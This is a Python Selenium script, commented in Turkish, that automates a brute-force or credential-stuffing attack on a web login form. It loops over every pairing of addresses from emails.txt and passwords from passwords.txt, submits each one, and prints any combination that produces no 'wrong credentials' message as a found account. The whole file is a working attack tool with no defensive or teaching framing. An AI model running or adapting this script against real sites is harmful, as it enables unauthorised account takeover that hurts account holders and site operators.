from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException
from itertools import product
import time

# URL ve dosya adlarını belirle
login_url = ""
emails_file = "emails.txt"
passwords_file = "passwords.txt"

# WebDriver seçeneklerini ayarla ve başlat
options = webdriver.ChromeOptions()
driver = webdriver.Chrome(options=options)

# E-posta ve şifre listelerini oluştur
with open(emails_file, 'r') as email_file:
    emails = [line.strip() for line in email_file]

with open(passwords_file, 'r') as password_file:
    passwords = [line.strip() for line in password_file]

# Tüm e-posta ve şifre kombinasyonlarını deneyin
for email, password in product(emails, passwords):
    try:
        driver.get(login_url)
        
        # E-posta ve şifre alanlarını doldur
        email_input = WebDriverWait(driver, 40).until(EC.element_to_be_clickable((By.CSS_SELECTOR, "input[type='email']")))
        email_input.send_keys(email)

        password_input = WebDriverWait(driver, 30).until(EC.element_to_be_clickable((By.CSS_SELECTOR, "input[type='password']")))
        password_input.send_keys(password)
        # Giriş yap düğmesine tıkla
        login_button = WebDriverWait(driver, 30).until(EC.element_to_be_clickable((By.XPATH, "//button[@type='submit']")))
        login_button.click()
        try:
            # Bilgi mesajının görünmesini bekle
            info_message_element = WebDriverWait(driver, 20).until(
                EC.element_to_be_clickable((By.CLASS_NAME, "text-danger")) # info-message-class, mesajın class adıdır
            )
            # Bilgi mesajında aradığınız metni kontrol et
            if "Hatalı" in info_message_element.text:
                print(f"Kullanıcı adı mesajı bulundu. {email} {info_message_element.text}")
        except TimeoutException:
            print(f" Kullanıcı bulundu {email} : {password}.")
    except Exception as e:
        print(f"{email} için bir hata oluştu: {str(e)}")
        continue  # Bir sonraki
# WebDriver'ı kapat
driver.quit()
